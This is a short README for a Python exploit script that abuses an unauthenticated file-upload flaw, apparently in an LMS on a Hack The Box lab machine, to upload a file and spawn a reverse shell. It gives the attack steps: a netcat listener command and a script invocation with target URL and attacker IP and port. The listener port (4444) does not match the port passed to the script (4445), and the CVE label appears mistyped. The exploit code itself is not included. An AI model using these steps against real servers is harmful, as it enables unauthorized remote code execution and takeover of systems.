# Prerequisites

```
pip install requests
```

# Information

The python script uses the vulnerability [CVE-2023-422](https://starlabs.sg/advisories/23/23-4220/) to upload a file into the server and uses that file to send a reverse shell to the netcat listener and all this can be done without being authenticated. However, you will need to follow the following steps to successfully use the python script.

**Start netcat listener:**

```bash
nc -lnvp 4444
```

**Executing Python Script (Example):**

```bash
python3 main.py -u "http://lms.permx.htb" -p "80" -ni "10.10.16.24" -np "4445"
```

# More...

Please leave a star if the following exploit was useful :)
